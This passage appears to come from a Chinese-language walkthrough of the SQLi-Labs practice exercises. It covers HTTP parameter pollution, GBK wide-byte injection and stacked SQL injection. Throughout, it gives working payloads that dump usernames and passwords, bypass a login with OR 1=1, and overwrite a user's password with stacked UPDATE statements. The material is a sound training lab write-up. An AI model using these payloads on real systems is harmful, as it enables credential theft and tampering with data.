header(\\\"Location: hacked.php\\\");\\n    }\\n}\\n\\n// The function below immitates the behavior of parameters when subject to HPP (HTTP Parameter Pollution).\\nfunction java_implementation($query_string)\\n{\\n    $q_s = $query_string;\\n    $qs_array = explode(\\\"\u0026\\\", $q_s);\\n    foreach ($qs_array as $key =\u003e $value) {\\n        $val = substr($value, 0, 2);\\n        if ($val == \\\"id\\\") {\\n            $id_value = substr($value, 3, 30);\\n            return $id_value;\\n            echo \\\"\u003cbr\u003e\\\";\\n            break;\\n        }\\n    }\\n}\\n\\n// ...\\n\\n$qs = $_SERVER[\\\"QUERY_STRING\\\"];\\n$id1 = java_implementation($qs);\\nwhitelist($id1);\\n\\n$id = $_GET[\\\"id\\\"];\\n$sql = \\\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\\\";\\n$result = mysql_query($sql);\\n?\u003e\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":\"linear-gradient(180deg, transparent 816px, var(--bg-transparent-golden) 816px 864px, transparent 864px, transparent 888px, var(--bg-transparent-golden) 888px 936px, transparent 936px)\"},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"$2f\"}}]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"\u003ccode class=\\\"x-inline-highlight\\\"\u003ejava_implementation\u003c/code\u003e模拟了一个存在漏洞的WAF的行为，当传入的参数重复时（\u003ccode class=\\\"x-inline-highlight\\\"\u003e?id=1\u0026id=2\u003c/code\u003e），WAF取第一个参数值\u003ccode class=\\\"x-inline-highlight\\\"\u003e1\u003c/code\u003e进行检查，而最后一个参数值\u003ccode class=\\\"x-inline-highlight\\\"\u003e2\u003c/code\u003e会被用于后续的SQL查询。\"}}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"三个Lab只有闭合方式不一样，\u003ccode class=\\\"x-inline-highlight\\\"\u003epayload\u003c/code\u003e依次为：\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"Python\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"payload = \\\"?id=1\u0026id=x' UNION SELECT 0,group_concat(username),group_concat(password) FROM security.users -- \\\"\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"payload \u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e \u003cspan class=\\\"token string\\\"\u003e\\\"?id=1\u0026amp;id=x' UNION SELECT 0,group_concat(username),group_concat(password) FROM security.users -- \\\"\u003c/span\u003e\"}}]}]]}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"Python\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"payload = '?id=1\u0026id=x\\\" UNION SELECT 0,group_concat(username),group_concat(password) FROM security.users -- '\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"payload \u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e \u003cspan class=\\\"token string\\\"\u003e'?id=1\u0026amp;id=x\\\" UNION SELECT 0,group_concat(username),group_concat(password) FROM security.users -- '\u003c/span\u003e\"}}]}]]}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"Python\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"payload = '?id=1\u0026id=x\\\") UNION SELECT 0,group_concat(username),group_concat(password) FROM security.users -- '\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"payload \u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e \u003cspan class=\\\"token string\\\"\u003e'?id=1\u0026amp;id=x\\\") UNION SELECT 0,group_concat(username),group_concat(password) FROM security.users -- '\u003c/span\u003e\"}}]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"注意这三个Lab使用\u003ccode class=\\\"x-inline-highlight\\\"\u003elogin.php\u003c/code\u003e文件。\"}}],[\"$\",\"h2\",null,{\"className\":\"x-h1\",\"children\":\"宽字节注入：L32-L37\"}],[\"$\",\"h3\",null,{\"className\":\"x-h2\",\"children\":\"前言 \u0026 笔记\"}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"宽字节注入需要服务端使用了某些特定的字符集（如GBK）来解析请求参数，利用服务器解析两个字节的特性“吃掉”一个转义字符。\"}}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"具体来说，L32-L37服务端都设置了：\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"PHP\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"mysql_query(\\\"SET NAMES gbk\\\");\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003cspan class=\\\"token function\\\"\u003emysql_query\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e(\u003c/span\u003e\u003cspan class=\\\"token string double-quoted-string\\\"\u003e\\\"SET NAMES gbk\\\"\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e)\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e;\u003c/span\u003e\"}}]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"同时服务端对输入的\u003ccode class=\\\"x-inline-highlight\\\"\u003e'\u003c/code\u003e和\u003ccode class=\\\"x-inline-highlight\\\"\u003e\u0026#92;\u003c/code\u003e都进行了转义。当需要闭合一个单引号时，考虑对服务器输入\u003ccode class=\\\"x-inline-highlight\\\"\u003e%df%27\u003c/code\u003e：\"}}],[\"$\",\"div\",null,{\"className\":\"x-table-wrapper\",\"children\":[\"$\",\"table\",null,{\"className\":\"x-table\",\"children\":[\"$\",\"tbody\",null,{\"children\":[[\"$\",\"tr\",null,{\"children\":[[\"$\",\"th\",null,{}],[\"$\",\"th\",null,{\"children\":\"Byte 1\"}],[\"$\",\"th\",null,{\"children\":\"Byte 2\"}],[\"$\",\"th\",null,{\"children\":\"Byte 3\"}]]}],[\"$\",\"tr\",null,{\"children\":[[\"$\",\"td\",null,{\"children\":\"输入\"}],[\"$\",\"td\",null,{\"children\":[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"\u003ccode class=\\\"x-inline-highlight\\\"\u003e0xdf\u003c/code\u003e\"}}]}],[\"$\",\"td\",null,{\"children\":[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"\u003ccode class=\\\"x-inline-highlight\\\"\u003e0x27\u003c/code\u003e (\u003ccode class=\\\"x-inline-highlight\\\"\u003e'\u003c/code\u003e)\"}}]}],[\"$\",\"td\",null,{}]]}],[\"$\",\"tr\",null,{\"children\":[[\"$\",\"td\",null,{\"children\":\"经过服务端转义\"}],[\"$\",\"td\",null,{\"children\":[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"\u003ccode class=\\\"x-inline-highlight\\\"\u003e0xdf\u003c/code\u003e\"}}]}],[\"$\",\"td\",null,{\"children\":[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"\u003ccode class=\\\"x-inline-highlight\\\"\u003e0x5c\u003c/code\u003e (\u003ccode class=\\\"x-inline-highlight\\\"\u003e\u0026#92;\u003c/code\u003e)\"}}]}],[\"$\",\"td\",null,{\"children\":[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"\u003ccode class=\\\"x-inline-highlight\\\"\u003e0x27\u003c/code\u003e (\u003ccode class=\\\"x-inline-highlight\\\"\u003e'\u003c/code\u003e)\"}}]}]]}],[\"$\",\"tr\",null,{\"children\":[[\"$\",\"td\",null,{\"children\":\"SQL解析\"}],[\"$\",\"td\",null,{\"colSpan\":2,\"children\":[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"\u003ccode class=\\\"x-inline-highlight\\\"\u003e0xdf5c\u003c/code\u003e (\u003ccode class=\\\"x-inline-highlight\\\"\u003e運\u003c/code\u003e)\"}}]}],[\"$\",\"td\",null,{\"children\":[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"\u003ccode class=\\\"x-inline-highlight\\\"\u003e0x27\u003c/code\u003e (\u003ccode class=\\\"x-inline-highlight\\\"\u003e'\u003c/code\u003e)\"}}]}]]}]]}]}]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"宽字节注入就是利用GBK编码将两个字节（\u003ccode class=\\\"x-inline-highlight\\\"\u003e0xdf\u003c/code\u003e，\u003ccode class=\\\"x-inline-highlight\\\"\u003e0x5c\u003c/code\u003e）解析为一个汉字字符（\u003ccode class=\\\"x-inline-highlight\\\"\u003e運\u003c/code\u003e），从而“吃掉”了转义字符（\u003ccode class=\\\"x-inline-highlight\\\"\u003e\u0026#92;\u003c/code\u003e），使得后续的单引号得以闭合。\"}}],[\"$\",\"$L17\",null,{\"src\":\"gbk1.jpg\",\"filterDarkTheme\":true}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"很多文章中的例子都使用\u003ccode class=\\\"x-inline-highlight\\\"\u003e%df\u003c/code\u003e进行注入，实际上这只是众多选择中的一个。GBK编码范围如下图所示，只要第一个字节在编码范围中就可以了。\"}}],[\"$\",\"$L17\",null,{\"src\":\"gbk2.jpg\",\"filterDarkTheme\":true}],[\"$\",\"h3\",null,{\"className\":\"x-h2\",\"children\":\"L32、L33、L36\"}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"服务端用了不同的转义函数（\u003ccode class=\\\"x-inline-highlight\\\"\u003epreg_replace\u003c/code\u003e、\u003ccode class=\\\"x-inline-highlight\\\"\u003eaddslashes\u003c/code\u003e、\u003ccode class=\\\"x-inline-highlight\\\"\u003emysql_real_escape_string\u003c/code\u003e），但是注入方式相同：\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"Python\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"payload = \\\"?id=%df' UNION SELECT 0,group_concat(username),group_concat(password) FROM security.users -- \\\"\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"payload \u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e \u003cspan class=\\\"token string\\\"\u003e\\\"?id=%df' UNION SELECT 0,group_concat(username),group_concat(password) FROM security.users -- \\\"\u003c/span\u003e\"}}]}]]}],[\"$\",\"h3\",null,{\"className\":\"x-h2\",\"children\":\"L34、L37\"}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"同样是服务端用了不同的转义函数（\u003ccode class=\\\"x-inline-highlight\\\"\u003eaddslashes\u003c/code\u003e和\u003ccode class=\\\"x-inline-highlight\\\"\u003emysql_real_escape_string\u003c/code\u003e），但不影响注入方式：\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"Python\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"payload = \\\"%df' OR 1=1 -- \\\"\\nresp = query_post(\\n    \\\"Less-34\\\", # \\\"Less-37\\\"\\n    data=f\\\"uname={payload}\u0026passwd=x\\\",\\n    headers={\\\"Content-Type\\\": \\\"application/x-www-form-urlencoded\\\"}\\n)\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"payload \u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e \u003cspan class=\\\"token string\\\"\u003e\\\"%df' OR 1=1 -- \\\"\u003c/span\u003e\\nresp \u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e query_post\u003cspan class=\\\"token punctuation\\\"\u003e(\u003c/span\u003e\\n    \u003cspan class=\\\"token string\\\"\u003e\\\"Less-34\\\"\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e,\u003c/span\u003e \u003cspan class=\\\"token comment\\\"\u003e# \\\"Less-37\\\"\u003c/span\u003e\\n    data\u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e\u003cspan class=\\\"token string-interpolation\\\"\u003e\u003cspan class=\\\"token string\\\"\u003ef\\\"uname=\u003c/span\u003e\u003cspan class=\\\"token interpolation\\\"\u003e\u003cspan class=\\\"token punctuation\\\"\u003e{\u003c/span\u003epayload\u003cspan class=\\\"token punctuation\\\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003cspan class=\\\"token string\\\"\u003e\u0026amp;passwd=x\\\"\u003c/span\u003e\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e,\u003c/span\u003e\\n    headers\u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e{\u003c/span\u003e\u003cspan class=\\\"token string\\\"\u003e\\\"Content-Type\\\"\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e:\u003c/span\u003e \u003cspan class=\\\"token string\\\"\u003e\\\"application/x-www-form-urlencoded\\\"\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e}\u003c/span\u003e\\n\u003cspan class=\\\"token punctuation\\\"\u003e)\u003c/span\u003e\\n\"}}]}]]}],[\"$\",\"h3\",null,{\"className\":\"x-h2\",\"children\":\"L35\"}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"PHP\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"$$sql = \\\"SELECT * FROM users WHERE id=$id LIMIT 0,1\\\";\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003cspan class=\\\"token variable\\\"\u003e$sql\u003c/span\u003e \u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e \u003cspan class=\\\"token string double-quoted-string\\\"\u003e\\\"SELECT * FROM users WHERE id=\u003cspan class=\\\"token interpolation\\\"\u003e\u003cspan class=\\\"token variable\\\"\u003e$id\u003c/span\u003e\u003c/span\u003e LIMIT 0,1\\\"\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e;\u003c/span\u003e\"}}]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"这题的意思是，既然服务端没有给\u003ccode class=\\\"x-inline-highlight\\\"\u003eid\u003c/code\u003e加引号，那我们就不需要闭合引号了，也没必要用宽字节注入了：\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"Python\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"payload = \\\"?id=99 UNION SELECT 0,group_concat(username),group_concat(password) FROM security.users -- \\\"\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"payload \u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e \u003cspan class=\\\"token string\\\"\u003e\\\"?id=99 UNION SELECT 0,group_concat(username),group_concat(password) FROM security.users -- \\\"\u003c/span\u003e\"}}]}]]}],[\"$\",\"h2\",null,{\"className\":\"x-h1\",\"children\":\"堆叠注入：L38-L45\"}],[\"$\",\"h3\",null,{\"className\":\"x-h2\",\"children\":\"前言 \u0026 笔记\"}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"前面的所有Lab都是基于单条SQL语句的注入，服务端使用\u003ccode class=\\\"x-inline-highlight\\\"\u003emysql_query($sql);\u003c/code\u003e执行SQL语句。\"}}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"而堆叠注入则是利用数据库支持在同一个请求中执行多条SQL语句的特性进行注入，不同语句之间用分号\u003ccode class=\\\"x-inline-highlight\\\"\u003e;\u003c/code\u003e分隔。这需要用到\u003ccode class=\\\"x-inline-highlight\\\"\u003emysqli_multi_query\u003c/code\u003e等函数。\"}}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"下面是来自PHP手册的一段代码示例：\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"PHP\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"\u003c?php\\nmysqli_report(MYSQLI_REPORT_ERROR | MYSQLI_REPORT_STRICT);\\n$link = mysqli_connect(\\\"localhost\\\", \\\"my_user\\\", \\\"my_password\\\", \\\"world\\\");\\n\\n$query = \\\"SELECT CURRENT_USER();\\\";\\n$query .= \\\"SELECT Name FROM City ORDER BY ID LIMIT 20, 5\\\";\\n\\n/* execute multi query */\\nmysqli_multi_query($link, $query);\\ndo {\\n    /* store the result set in PHP */\\n    if ($result = mysqli_store_result($link)) {\\n        while ($row = mysqli_fetch_row($result)) {\\n            printf(\\\"%s\\\\n\\\", $row[0]);\\n        }\\n    }\\n    /* print divider */\\n    if (mysqli_more_results($link)) {\\n        printf(\\\"-----------------\\\\n\\\");\\n    }\\n} while (mysqli_next_result($link));\\n?\u003e\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"$30\"}}]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"当堆叠注入漏洞存在时，我们能够在注入点后追加任意SQL语句而不受限于原有查询的结构，从而实现更强大的功能。\"}}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"这一部分的Lab我们以修改\u003ccode class=\\\"x-inline-highlight\\\"\u003eDumb\u003c/code\u003e用户（\u003ccode class=\\\"x-inline-highlight\\\"\u003eid=1\u003c/code\u003e）的密码作为目标，也就是执行如下SQL语句：\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"SQL\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"UPDATE security.users SET password='hacked' WHERE id='1';\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003cspan class=\\\"token keyword\\\"\u003eUPDATE\u003c/span\u003e security\u003cspan class=\\\"token punctuation\\\"\u003e.\u003c/span\u003eusers \u003cspan class=\\\"token keyword\\\"\u003eSET\u003c/span\u003e password\u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e\u003cspan class=\\\"token string\\\"\u003e'hacked'\u003c/span\u003e \u003cspan class=\\\"token keyword\\\"\u003eWHERE\u003c/span\u003e id\u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e\u003cspan class=\\\"token string\\\"\u003e'1'\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e;\u003c/span\u003e\"}}]}]]}],[\"$\",\"h3\",null,{\"className\":\"x-h2\",\"children\":\"L38-L41\"}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"四个Lab只有闭合方式不同。\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"Python\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"payload = \\\"?id=1';  UPDATE security.users SET password='hacked-L38' WHERE id='1'; -- \\\"\\npayload = \\\"?id=1;   UPDATE security.users SET password='hacked-L39' WHERE id='1'; -- \\\"\\npayload = \\\"?id=1'); UPDATE security.users SET password='hacked-L40' WHERE id='1'; -- \\\"\\npayload = \\\"?id=1;   UPDATE security.users SET password='hacked-L41' WHERE id='1'; -- \\\"\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"payload \u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e \u003cspan class=\\\"token string\\\"\u003e\\\"?id=1';  UPDATE security.users SET password='hacked-L38' WHERE id='1'; -- \\\"\u003c/span\u003e\\npayload \u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e \u003cspan class=\\\"token string\\\"\u003e\\\"?id=1;   UPDATE security.users SET password='hacked-L39' WHERE id='1'; -- \\\"\u003c/span\u003e\\npayload \u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e \u003cspan class=\\\"token string\\\"\u003e\\\"?id=1'); UPDATE security.users SET password='hacked-L40' WHERE id='1'; -- \\\"\u003c/span\u003e\\npayload \u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e \u003cspan class=\\\"token string\\\"\u003e\\\"?id=1;   UPDATE security.users SET password='hacked-L41' WHERE id='1'; -- \\\"\u003c/span\u003e\\n\"}}]}]]}],[\"$\",\"h3\",null,{\"className\":\"x-h2\",\"children\":\"L42-L45\"}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"L44和L45分别是L42和L43的盲注版本。\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"Python\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"payload = \\\"x'; UPDATE security.users SET password='hacked-L42' WHERE id='1'; -- \\\"\\nresp = query_post(\\\"Less-42/login.php\\\", data={\\\"login_user\\\": \\\"x\\\", \\\"login_password\\\": payload})\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"payload \u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e \u003cspan class=\\\"token string\\\"\u003e\\\"x'; UPDATE security.users SET password='hacked-L42' WHERE id='1'; -- \\\"\u003c/span\u003e\\nresp \u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e query_post\u003cspan class=\\\"token punctuation\\\"\u003e(\u003c/span\u003e\u003cspan class=\\\"token string\\\"\u003e\\\"Less-42/login.php\\\"\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e,\u003c/span\u003e data\u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e{\u003c/span\u003e\u003cspan class=\\\"token string\\\"\u003e\\\"login_user\\\"\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e:\u003c/span\u003e \u003cspan class=\\\"token string\\\"\u003e\\\"x\\\"\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e,\u003c/span\u003e \u003cspan class=\\\"token string\\\"\u003e\\\"login_password\\\"\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e:\u003c/span\u003e payload\u003cspan class=\\\"token punctuation\\\"\u003e}\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e)\u003c/span\u003e\\n\"}}]}]]}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"Python\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"payload = \\\"x'); UPDATE security.users SET password='hacked-L43' WHERE id='1'; -- \\\"\\nresp = query_post(\\\"Less-43/login.php\\\", data={\\\"login_user\\\": \\\"x\\\", \\\"login_password\\\": payload})\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"payload \u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e \u003cspan class=\\\"token string\\\"\u003e\\\"x'); UPDATE security.users SET password='hacked-L43' WHERE id='1'; -- \\\"\u003c/span\u003e\\nresp \u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e query_post\u003cspan class=\\\"token punctuation\\\"\u003e(\u003c/span\u003e\u003cspan class=\\\"token string\\\"\u003e\\\"Less-43/login.php\\\"\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e,\u003c/span\u003e data\u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e{\u003c/span\u003e\u003cspan class=\\\"token string\\\"\u003e\\\"login_user\\\"\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e:\u003c/span\u003e \u003cspan class=\\\"token string\\\"\u003e\\\"x\\\"\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e,\u003c/span\u003e \u003cspan class=\\\"token string\\\"\u003e\\\"login_password\\\"\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e:\u003c/span\u003e payload\u003cspan class=\\\"token punctuation\\\"\u003e}\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e)\u003c/span\u003e\\n\"}}]}]]}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"Python\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"payload = \\\"x'; UPDATE security.users SET password='hacked-L44' WHERE id='1'; -- \\\"\\nresp = query_post(\\\"Less-44/login.php\\\", data={\\\"login_user\\\": \\\"x\\\", \\\"login_password\\\": payload})\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"payload \u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e \u003cspan class=\\\"token string\\\"\u003e\\\"x'; UPDATE security.users SET password='hacked-L44' WHERE id='1'; -- \\\"\u003c/span\u003e\\nresp \u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e query_post\u003cspan class=\\\"token punctuation\\\"\u003e(\u003c/span\u003e\u003cspan class=\\\"token string\\\"\u003e\\\"Less-44/login.php\\\"\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e,\u003c/span\u003e data\u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e{\u003c/span\u003e\u003cspan class=\\\"token string\\\"\u003e\\\"login_user\\\"\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e:\u003c/span\u003e \u003cspan class=\\\"token string\\\"\u003e\\\"x\\\"\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e,\u003c/span\u003e \u003cspan class=\\\"token string\\\"\u003e\\\"login_password\\\"\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e:\u003c/span\u003e payload\u003cspan class=\\\"token punctuation\\\"\u003e}\u003c/span\u003e\u003cspan class=\\\"token 